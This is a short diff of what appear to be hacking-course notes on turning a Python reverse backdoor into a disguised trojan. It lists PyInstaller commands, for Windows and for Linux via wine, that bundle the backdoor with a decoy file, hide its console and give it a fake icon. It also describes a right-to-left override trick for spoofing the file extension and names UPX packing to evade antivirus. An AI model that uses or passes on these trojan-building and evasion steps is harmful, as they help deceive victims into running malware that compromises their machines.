@@ -1,9 +1,16 @@
 To embedd backdoor with a file: 
-#wine /location_of_pyinstaller.exe --add-data "location_of_file;." --onefile --noconsole location_of_reverse_backdoor.py
+1. For linux: #wine /location_of_pyinstaller_in_linux.exe --add-data "location_of_file;." --onefile --noconsole location_of_reverse_backdoor.py
+2. Fo Windows #location_of_pyinstaller.exe backdoor.py --onefile --noconsole location_of_reverse_backdoor.py
+
+To change .exe to trojan extension:
 Iconfinder.com
 easyicon.net
-To change .exe to trojan extension:
+1. For linux: #wine /location_of_pyinstaller_in_linux.exe --add-data "location_of_file;." --onefile --noconsole --icon location_of_icon_file location_of_reverse_backdoor.py
+2. Fo Windows #location_of_pyinstaller.exe backdoor.py --onefile --noconsole --icon location_of_icon_file location_of_reverse_backdoor.py
+
+Changing Right to left extension:
 kali->character->right_to _left->copy_character->open_txt_file->zaid.exe_\n_zaid-fdp.exe->Cursor@fdp.exe->Paste->Copy->Rename->Paste->Compress
+
 To bypass antivirus:
 upx.github.io
 To check bypass:
